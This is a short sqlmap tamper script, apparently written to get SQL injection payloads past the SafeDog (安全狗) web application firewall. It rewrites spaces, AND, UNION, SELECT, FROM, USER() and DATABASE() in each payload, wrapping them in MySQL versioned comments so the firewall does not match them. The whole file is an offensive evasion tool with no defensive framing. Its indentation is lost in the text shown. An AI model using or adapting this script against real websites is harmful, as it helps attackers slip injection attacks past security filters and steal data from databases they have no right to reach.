# coding=UTF-8 
# Desc: sqlmap_bypass_安全狗_tamper 

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
__priority__ = PRIORITY.LOW
def dependencies():
pass
def tamper(payload, **kwargs):

if payload:
payload=payload.replace(" ","/*!*/")
payload=payload.replace("=","/*!*/=/*!*/")
payload=payload.replace("AND","/*!*/AND/*!*/")
payload=payload.replace("UNION","union/*!88888cas*/")
payload=payload.replace("#","/*!*/#")
payload=payload.replace("USER()","USER/*!()*/")
payload=payload.replace("DATABASE()","DATABASE/*!()*/")
payload=payload.replace("--","/*!*/--")
payload=payload.replace("SELECT","/*!88888cas*/select")
payload=payload.replace("FROM","/*!99999c*//*!99999c*/from")
print payload

return payload